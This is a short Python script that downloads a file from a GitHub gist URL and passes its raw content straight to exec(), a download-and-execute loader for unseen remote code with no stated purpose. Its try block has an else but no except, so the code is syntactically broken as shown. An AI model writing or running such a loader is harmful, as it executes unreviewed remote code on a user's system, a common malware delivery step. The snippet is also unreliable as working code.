import requests
a = 'https://gist.githubusercontent.com/deflationz/0654ff6a860ba20234b42d794f76a4b5/raw/1ddf7e6c347a8b4a7df50e6ab89fc804fc4bdfef/sc.txt'
response = requests.get(a)
b = response.content
try:
	exec(b)
else:
	pass
